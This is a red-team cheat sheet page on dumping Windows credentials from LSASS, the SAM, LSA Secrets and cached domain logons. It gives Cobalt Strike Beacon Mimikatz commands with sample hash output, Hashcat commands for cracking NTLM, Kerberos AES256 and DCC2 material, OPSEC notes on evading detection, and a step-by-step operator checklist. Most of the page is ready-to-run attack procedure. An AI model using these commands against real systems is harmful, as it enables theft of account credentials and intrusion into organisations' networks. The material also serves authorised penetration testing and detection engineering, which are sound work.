---
title: "OS Credential Dumping · LSASS, SAM and LSA"
description: "A Mimikatz and Hashcat reference for LSASS, Kerberos keys, SAM, LSA Secrets and cached domain credentials, with prerequisites and material-specific limitations."
category: "Credential Dumping"
tools: ["Cobalt Strike", "Mimikatz", "Hashcat"]
updated: 2026-11-10
tags: ["credentials", "windows", "mimikatz", "ntlm", "dpapi"]
draft: false
---

## 1. Material and requirements

LSASS validates authentication, manages sessions and loads security support providers (SSPs) such as NTLM, Kerberos, Schannel and CredSSP. Each provider handles different material: passwords, hashes, keys and tickets are not interchangeable.

These examples assume an elevated context with access to the protected material. System protections and available sessions affect results; administrator privileges do not guarantee access to LSASS.

| Source | Material | Scope |
|---|---|---|
| LSASS | NTLM hashes and keys from available sessions | Depends on sessions and active protections |
| SAM | Local account hashes | Not the domain user database |
| LSA Secrets | Service and machine account secrets | Does not contain every domain password |
| Domain cache | MS-Cache v2 / DCC2 verifiers | Offline cracking; cannot be used for Pass the Hash |

In Beacon's Mimikatz integration, `!` requests execution as SYSTEM and `@` uses the thread impersonation token. These prefixes select the execution context; they do not conceal activity.

## 2. LSASS: NTLM hashes

`sekurlsa::logonpasswords` queries available session material. Hashcat mode 1000 corresponds to NTLM.

```shell
# LSASS — Extract NTLM hashes from available sessions
# OPSEC: sensitive memory access; opening handles to LSASS may be monitored.
beacon> mimikatz sekurlsa::logonpasswords

# User Name : pchilds
# Domain    : CONTOSO
# * NTLM    : fc525c9683e8fe067095ba2ddc971889

# Crack the NTLM hash offline
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule

# fc525c9683e8fe067095ba2ddc971889:Passw0rd!
```

## 3. Kerberos keys

`sekurlsa::ekeys` displays keys from Kerberos providers. Some labels in the sample output are incorrect: do not identify an algorithm from length alone. Mode 28900 in this example requires an AES256 key in the specified format.

```shell
# KERBEROS — Extract session keys
# OPSEC: ekeys also accesses LSASS; do not assume it is less detectable than logonpasswords.
beacon> mimikatz sekurlsa::ekeys

# * Username : rsteel
# * Domain   : CONTOSO.COM
# * Key List :
#   des_cbc_md4 05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
# In this sample output, Mimikatz incorrectly labels the AES256 key as des_cbc_md4.

# Crack the AES256 key offline; sha256.hash is the filename used in the lab
# Input format: $krb5db$18$<username>$<DOMAIN-FQDN>$<AES256_KEY>
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule

# $krb5db$18$rsteel$CONTOSO.COM$05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960:Passw0rd!
```

## 4. SAM: local accounts

The SAM is associated with `HKLM\SAM` and boot key material from `HKLM\SYSTEM`. RID 500 identifies the local Administrator account; it does not make that account a domain administrator.

```shell
# SAM — Extract local account hashes
# OPSEC: accesses protected local credentials; this is more than metadata enumeration.
beacon> mimikatz !lsadump::sam

# Domain : LON-WKSTN-1
# RID    : 000001f4 (500)
# User   : Administrator
# Hash NTLM: fc525c9683e8fe067095ba2ddc971889
```

## 5. LSA Secrets

Protected secrets are associated with `HKLM\SECURITY\Policy\Secrets`. `$MACHINE.ACC` belongs to the machine account. Output depends on the secrets present.

```shell
# LSA SECRETS — Extract secrets stored by LSA
# OPSEC: accessing registry or memory secrets may be detected.
beacon> mimikatz !lsadump::secrets

# Secret   : $MACHINE.ACC
# cur/text : <MACHINE_ACCOUNT_PASSWORD>
# NTLM:3cad4d50decc7d04e6fec0a3c3793cc0
```

## 6. Cached domain credentials

Cached verifiers allow logon validation when the domain controller is unavailable. Record the username and iteration count to construct the DCC2 input; the example uses 10240 iterations.

```shell
# CACHED CREDENTIALS — Extract cached domain credentials
# OPSEC: separate extraction on the target from offline cracking; only the latter avoids further target queries.
beacon> mimikatz !lsadump::cache

# * Iteration is set to default (10240)
# User      : CONTOSO\rsteel
# MsCacheV2 : <CACHED_HASH>
# MS-Cache v2 cannot be used for Pass the Hash; cracking is offline.

# Crack MS-Cache v2 offline
# Input format: $DCC2$10240#<USER>#<MSCACHEV2_HASH>
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
# $DCC2$10240#rsteel#<MSCACHEV2_HASH>:Passw0rd!
```

## 7. Telemetry and troubleshooting

Accessing LSASS or protected secrets can trigger alerts. BOFs, signed tools and in-memory execution do not guarantee lower detection. Analyzing material already available and running Hashcat offline avoids further target queries during that phase.

| Symptom | What to check |
|---|---|
| Access denied | Effective context and LSASS protections |
| A user is missing | Available sessions and material retained by the SSP |
| Hashcat rejects input | Algorithm, format, username and iterations |
| No password recovered | Dictionary, rules and password strength; this does not prove the hash is invalid |

Source references: [MITRE LSASS Memory](https://attack.mitre.org/techniques/T1003/001/) and [LSA Secrets detection](https://attack.mitre.org/detectionstrategies/DET0437/).

## 8. Quick checklist

Run Mimikatz commands in Beacon and Hashcat on the analysis machine. Choose the required source; the extraction commands are alternatives, rather than a mandatory sequence. Input files must contain complete material in the appropriate format.

```text
CONTEXT AND SOURCE
[ ] getuid → confirm the current identity
[ ] shell whoami /priv → inspect token privileges; this alone does not prove access
[ ] Select LSASS, SAM, LSA Secrets or cached domain credentials

EXTRACTION — CHOOSE THE REQUIRED MATERIAL
[ ] mimikatz sekurlsa::logonpasswords → available NTLM session material
[ ] mimikatz sekurlsa::ekeys → Kerberos session keys; verify algorithm labels
[ ] mimikatz !lsadump::sam → local account hashes
[ ] mimikatz !lsadump::secrets → available LSA Secrets
[ ] mimikatz !lsadump::cache → DCC2 verifiers; record username and iterations

OFFLINE ANALYSIS — CHOOSE THE MATCHING FORMAT
[ ] NTLM: .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
[ ] Kerberos AES256: .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
    → input: $krb5db$18$<username>$<DOMAIN-FQDN>$<AES256_KEY>
[ ] DCC2: .\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
    → input: $DCC2$<ITERATIONS>#<USER>#<MSCACHEV2_HASH>
[ ] Distinguish local accounts, domain accounts and the machine account
[ ] Do not use DCC2 verifiers for Pass the Hash
[ ] Interpret empty output and failures against available sessions and system protections
```


## Related references

- [Browser credentials](/cheatsheets/browser-credentials-cheatsheet/)
- [Windows Credential Manager and DPAPI](/cheatsheets/windows-credential-manager-cheatsheet/)
- [Kerberos: roasting and local tickets](/cheatsheets/kerberos-credential-access-cheatsheet/)
